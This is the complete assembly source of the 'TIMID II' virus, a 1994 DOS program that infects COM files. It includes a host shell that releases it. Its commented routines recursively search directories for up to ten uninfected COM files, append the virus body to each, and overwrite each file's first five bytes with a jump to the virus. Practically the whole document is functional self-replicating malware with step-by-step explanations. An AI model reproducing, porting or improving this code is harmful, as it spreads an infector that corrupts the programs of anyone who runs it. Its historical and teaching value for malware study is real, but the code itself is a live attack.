;The TIMID II Virus is a parasitic COM infector that places the body of its
;code at the end of a COM file. It will jump directories.
;
;(C) 1994 American Eagle Publications, Inc. All Rights Reserved!
;

.model tiny
.code


        ORG     100H

;This is a shell of a program which will release the virus into the system.
;All it does is jump to the virus routine, which does its job and returns to
;it, at which point it terminates to DOS.

HOST:
        jmp     NEAR PTR VIRUS_START
        db      'VI'
        db      100H dup (90H)  ;force above jump to be near with 256 nop's
        mov     ax,4C00H
        int     21H             ;terminate normally with DOS

VIRUS:                          ;this is a label for the first byte of the virus

ALLFILE DB      '*.*',0         ;search string for a file
START_IMAGE     DB 0,0,0,0,0

VIRUS_START:
        call    GET_START       ;get start address - this is a trick to determine the location of the start of this program
GET_START:
        pop     di
        sub     di,OFFSET GET_START
        call    INFECT_FILES
EXIT_VIRUS:
        mov     ah,1AH          ;restore DTA
        mov     dx,80H
        int     21H
        mov     si,OFFSET HOST  ;restore start code in host
        add     di,OFFSET START_CODE
        push    si              ;push OFFSET HOST for ret below
        xchg    si,di
        movsw
        movsw
        movsb
        ret                     ;and jump to host

START_CODE:                     ;move first 5 bytes from host program to here
        nop                     ;nop's for the original assembly code
        nop                     ;will work fine
        nop
        nop
        nop


INF_CNT DB      ?               ;Live counter of files infected
DEPTH   DB      ?               ;depth of directory search, 0=no subdirs
PATH    DB      10 dup (0)      ;path to search

INFECT_FILES:
        mov     [di+INF_CNT],10 ;infect up to 10 files
        mov     [di+DEPTH],1
        call    SEARCH_DIR
        cmp     [di+INF_CNT],0  ;have we infected 10 files
        jz      IFDONE          ;yes, done, no, search root also
        mov     ah,47H          ;get current directory
        xor     dl,dl           ;on current drive
        lea     si,[di+CUR_DIR+1]       ;put path here
        int     21H
        mov     [di+DEPTH],2
        mov     ax,'\'
        mov     WORD PTR [di+PATH],ax
        mov     ah,3BH
        lea     dx,[di+PATH]
        int     21H             ;change directory
        call    SEARCH_DIR
        mov     ah,3BH          ;now change back to original directory
        lea     dx,[di+CUR_DIR]
        int     21H
IFDONE: ret

PRE_DIR DB      '..',0
CUR_DIR DB      '\'
        DB      65 dup (0)

;This searches the current director for files to infect or subdirectories to
;search. This routine is recursive.
SEARCH_DIR:
        push    bp              ;set up stack frame
        sub     sp,43H          ;subtract size of DTA needed for search
        mov     bp,sp
        mov     dx,bp           ;put DTA to the stack
        mov     ah,1AH
        int     21H
        lea     dx,[di+OFFSET ALLFILE]
        mov     cx,3FH
        mov     ah,4EH
SDLP:   int     21H
        jc      SDDONE
        mov     al,[bp+15H]     ;get attribute of file found
        and     al,10H          ;(00010000B) is it a directory?
        jnz     SD1             ;yes, go handle dir
        call    FILE_OK         ;just a file, ok to infect?
        jc      SD2             ;nope, get another
        call    INFECT          ;yes, infect it
        dec     [di+INF_CNT]    ;decrement infect count
        cmp     [di+INF_CNT],0  ;is it zero
        jz      SDDONE          ;yes, searching done
        jmp     SD2             ;nope, search for another

SD1:    cmp     [di+DEPTH],0    ;are we at the bottom of search
        jz      SD2             ;yes, don't search subdirs
        cmp     BYTE PTR [bp+1EH],'.'
        jz      SD2             ;don't try to search '.' or '..'
        dec     [di+DEPTH]      ;decrement depth count
        lea     dx,[bp+1EH]     ;else get directory name
        mov     ah,3BH
        int     21H             ;change directory into it
        jc      SD2             ;continue if error
        call    SEARCH_DIR      ;ok, recursive search and infect
        lea     dx,[di+PRE_DIR] ;now go back to original dir
        mov     ah,3BH
        int     21H
        inc     [di+DEPTH]
        cmp     [di+INF_CNT],0  ;done infecting files?
        jz      SDDONE
        mov     dx,bp           ;restore DTA to this stack frame
        mov     ah,1AH
        int     21H

SD2:    mov     ah,4FH
        jmp     SDLP

SDDONE: add     sp,43H
        pop     bp
        ret



;--------------------------------------------------------------------------
;Function to determine whether the file specified in FNAME is useable.
;if so return nc, else return c.
;What makes a file useable?:
;              a) It must have the extent COM.
;              b) There must be space for the virus without exceeding the
;                 64 KByte file size limit.
;              c) Bytes 0, 3 and 4 of the file are not a near jump op code,
;                 and 'V', 'I', respectively
;
FILE_OK:
        lea     si,[bp+1EH]
        mov     dx,si
FO1:    lodsb                   ;get a byte of file name
        cmp     al,'.'          ;is it '.'?
        je      FO2             ;yes, look for COM now
        cmp     al,0            ;end of name?
        jne     FO1             ;no, get another character
        jmp     FOKCEND         ;yes, exit with c set, not a COM file
FO2:    lodsw                   ;ok, look for COM
        cmp     ax,'OC'
        jne     FOKCEND
        lodsb
        cmp     al,'M'
        jne     FOKCEND

        mov     ax,3D02H        ;r/w access open file, since we'll want to write to it
        int     21H
        jc      FOK_END         ;error opening file - quit and say this file can't be used

        mov     bx,ax           ;put file handle in bx
        mov     cx,5            ;next read 5 bytes at the start of the program
        lea     dx,[di+START_IMAGE]
        mov     ah,3FH          ;DOS read function
        int     21H

        pushf
        mov     ah,3EH
        int     21H             ;and close the file
        popf                    ;check for failed read
        jc      FOK_END

        mov     ax,[bp+1AH]                            ;get size of original file
        add     ax,OFFSET ENDVIR - OFFSET VIRUS + 100H ;and add the size of the virus to it
        jc      FOK_END                                ;c set if ax overflows, which will happen if size goes above 64K
        cmp     WORD PTR [di+START_IMAGE],'ZM'         ;watch for exe format
        je      FOKCEND                                ;exe - don't infect!
        cmp     BYTE PTR [di+START_IMAGE],0E9H         ;size ok - is first byte a near jump op code?
        jnz     FOK_NCEND                              ;not a near jump, file must be ok, exit with z set
        cmp     WORD PTR [di+START_IMAGE+3],'IV'       ;ok, is 'VI' in positions 3 & 4?
        jnz     FOK_NCEND                              ;no, file can be infected, return with Z set
FOKCEND:stc
FOK_END:ret

FOK_NCEND:
        clc
        ret

;--------------------------------------------------------------------------
;This routine moves the virus (this program) to the end of the COM file
;Basically, it just copies everything here to there, and then goes and
;adjusts the 5 bytes at the start of the program and the five bytes stored
;in memory.
;
INFECT:
        lea     dx,[bp+1EH]
        mov     ax,3D02H                                ;r/w access open file, since we'll want to write to it
        int     21H
        mov     bx,ax                                   ;and keep file handle in bx

        xor     cx,cx                                   ;prepare to write virus on new file; positon file pointer
        mov     dx,cx                                   ;cx:dx pointer = 0
        mov     ax,4202H                                ;locate pointer to end DOS function
        int     21H

        mov     cx,OFFSET ENDVIR - OFFSET VIRUS         ;now write the virus; cx=number of bytes to write
        lea     dx,[di+VIRUS]
        mov     ah,40H                                  ;DOS write function
        int     21H

        xor     cx,cx                                   ;now we have to go save the 5 bytes which came from the start of the
        mov     dx,[bp+1AH]
        add     dx,OFFSET START_CODE - OFFSET VIRUS     ;to where START_CODE is in the new virus
        mov     ax,4200H                                ;and use DOS to position the file pointer
        int     21H

        mov     cx,5                                    ;now go write START_CODE in the file
        lea     dx,[di+START_IMAGE]
        mov     ah,40H
        int     21H

        xor     cx,cx                                   ;now go back to the start of host program
        mov     dx,cx                                   ;so we can put the jump to the virus in
        mov     ax,4200H                                ;locate file pointer function
        int     21H

        mov     BYTE PTR [di+START_IMAGE],0E9H          ;first the near jump op code E9
        mov     ax,[bp+1AH]                             ;and then the relative address
        add     ax,OFFSET VIRUS_START-OFFSET VIRUS-3    ;these go in the START_IMAGE area
        mov     WORD PTR [di+START_IMAGE+1],ax
        mov     WORD PTR [di+START_IMAGE+3],4956H       ;and put 'VI' ID code in

        mov     cx,5                                    ;ok, now go write the 5 bytes we just put in START_IMAGE
        lea     dx,[di+START_IMAGE]
        mov     ah,40H                                  ;DOS write function
        int     21H

        mov     ah,3EH                                  ;and close file
        int     21H

        ret                             ;all done, the virus is transferred

ENDVIR:


        END HOST
